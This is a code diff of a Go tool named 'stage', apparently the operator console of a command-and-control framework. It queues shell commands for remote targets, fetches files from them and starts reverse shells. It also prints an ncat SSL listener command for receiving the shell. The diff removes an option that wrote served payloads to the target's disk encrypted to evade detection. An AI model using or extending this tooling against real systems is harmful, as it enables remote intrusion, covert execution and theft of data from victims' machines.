@@ -21,26 +21,32 @@ const (
 )
 
 var (
-	cmdMap    = make(map[string]int)
-	app       = kingpin.New("stage", "stage commands or files for remote systems")
+	cmdMap = make(map[string]int)
+	app    = kingpin.New("stage", "stage commands or files for remote systems")
+
 	file      = app.Command("file", "stage a file")
 	viewFile  = file.Command("view", "view current file stage")
 	serveFile = file.Command("serve", "serve a specified file")
-	encrypt   = serveFile.Flag("encrypt", "file will be written to disk encrypted, ideal if there is a packer on disk").Bool()
 	deleteF   = file.Command("clear", "remove a file from the stage")
-	filename  = serveFile.Arg("filename", "name of file to stage").Required().String()
-	outfile   = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
-	cmd       = app.Command("cmd", "stage a command")
-	exe       = cmd.Command("exec", "execute a shell command on target")
-	get       = cmd.Command("get", "get file(s) from a remote system")
-	revshell  = cmd.Command("revshell", "initiate reverse shell with one remote system")
-	viewCmd   = cmd.Command("view", "view current command stage")
-	deleteC   = cmd.Command("clear", "remove a command from the stage")
+
+	filename = serveFile.Arg("filename", "name of file to stage").Required().String()
+	outfile  = serveFile.Arg("outfile", "name of file to write to remote disk").Default("").String()
+
+	cmd      = app.Command("cmd", "stage a command")
+	exe      = cmd.Command("exec", "execute a shell command on target")
+	get      = cmd.Command("get", "get file(s) from a remote system")
+	revshell = cmd.Command("revshell", "initiate reverse shell with one remote system")
+	viewCmd  = cmd.Command("view", "view current command stage")
+	deleteC  = cmd.Command("clear", "remove a command from the stage")
+
 	cmdstring = exe.Arg("command", "command to execute").Required().String()
-	files     = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
-	lhost     = revshell.Arg("lhost", "host that client connects to").Required().String()
-	lport     = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
-	forwho    = app.Flag("for", "name of target to receive command").String()
+
+	files = get.Arg("files", "array of files to fetch remotely, comma-separated").Required().String()
+
+	lhost = revshell.Arg("lhost", "host that client connects to").Required().String()
+	lport = revshell.Arg("lport", "port that client will connect to and server listens on").Required().String()
+
+	forwho = app.Flag("for", "name of target to receive command").String()
 )
 
 func main() {
@@ -90,25 +96,11 @@ func handleServe(db *datastore.Kdb) {
 		log.Fatal(err)
 	}
 	var uuid string
-	if !*encrypt {
-		log.Warn("'encrypt' flag was not set, meaning file will be unencrypted on disk.")
-	}
-	if *encrypt && len(*forwho) == 0 {
-		log.Fatal("'for' flag must be provided in order to encrypt the file with the profile's aeskey")
-	}
 	if len(*forwho) != 0 {
 		// if not broadcast, encrypt the file object
 		uuid, err = datastore.GetUUIDByName(*forwho)
 		if err != nil {
 			log.Fatal(err)
-		}
-		// encrypt the file bytes if --encrypt is set
-		if *encrypt {
-			aeskey, X1, X2 := db.GetKeysByUUID(uuid)
-			bytes, err = kes.EncryptObject(bytes, aeskey, X1, X2)
-			if err != nil {
-				log.Fatal(err)
-			}
 		}
 	}
 	index := 0
@@ -181,7 +173,6 @@ func handleCmd(db *datastore.Kdb, myCmd string) {
 		if err != nil {
 			log.Fatal(err)
 		}
-
 		cmd := fmt.Sprintf("ncat -lnvp %s --ssl-cert %s --ssl-key %s", *lport, crtfile, keyfile)
 		fmt.Println("[+] run in separate terminal window:")
 		fmt.Println(cmd)
